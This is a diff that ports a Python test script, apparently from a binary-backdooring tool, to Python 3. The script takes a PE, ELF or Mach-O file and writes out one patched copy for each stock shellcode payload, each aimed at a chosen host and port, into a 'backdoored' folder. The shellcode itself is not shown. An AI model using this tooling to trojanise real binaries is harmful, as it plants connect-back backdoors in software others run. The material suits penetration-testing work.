@@ -32,9 +32,9 @@ POSSIBILITY OF SUCH DAMAGE.
 
 '''
 
-import pebin
-import machobin
-import elfbin
+from pebin import pebin
+from elfbin import elfbin
+from machobin import machobin
 import sys
 import os
 
@@ -64,9 +64,9 @@ if __name__ == "__main__":
     Usage: ./payloadtests.py file 127.0.0.1 8080
     '''
     if len(sys.argv) != 4:
-        print "Will create patched binaries for each stock shellcode/payload for the "
-        print "type of binary provided. Each payload type has it's own port number."
-        print "Usage:" + str(sys.argv[0]) + " binary HOST PORT"
+        print("Will create patched binaries for each stock shellcode/payload for the ")
+        print("type of binary provided. Each payload type has it's own port number.")
+        print("Usage:" + str(sys.argv[0]) + " binary HOST PORT")
         sys.exit()
 
     file = sys.argv[1]
@@ -86,7 +86,7 @@ if __name__ == "__main__":
                 if 'cave_miner' in aShell or 'user_supplied' in aShell:
                     continue
                 aName = aShell + "." + patchtype + "." + str(host) + "." + str(port) + "." + file
-                print "Creating File:", aName
+                print("Creating File:", aName)
                 if patchtype == 'APPEND':
                     supported_file = pebin.pebin(FILE=file, OUTPUT=aName,
                                                  SHELL=aShell, HOST=host,
@@ -113,7 +113,7 @@ if __name__ == "__main__":
             if 'cave_miner' in aShell or 'user_supplied' in aShell:
                 continue
             aName = aShell + "." + str(host) + "." + str(port) + "." + file
-            print "Creating File:", aName
+            print("Creating File:", aName)
             supported_file = elfbin.elfbin(FILE=file, OUTPUT=aName,
                                            SHELL=aShell, HOST=host,
                                            PORT=port)
@@ -130,7 +130,7 @@ if __name__ == "__main__":
             if 'cave_miner' in aShell or 'user_supplied' in aShell:
                 continue
             aName = aShell + "." + str(host) + "." + str(port) + "." + file
-            print "Creating File:", aName
+            print("Creating File:", aName)
             supported_file = machobin.machobin(FILE=file, OUTPUT=aName,
                                                SHELL=aShell, HOST=host,
                                                PORT=port, FAT_PRIORITY='ALL')
@@ -139,10 +139,10 @@ if __name__ == "__main__":
 
             port += 1
 
-    print "Successful files are in backdoored:"
-    for afile, aresult in outputfiles.iteritems():
+    print("Successful files are in backdoored:")
+    for afile, aresult in outputfiles.items():
         if aresult is True:
-            print afile, 'Success'
+            print(afile, 'Success')
         else:
-            print afile, 'Fail'
+            print(afile, 'Fail')
             os.remove('backdoored/' + afile)
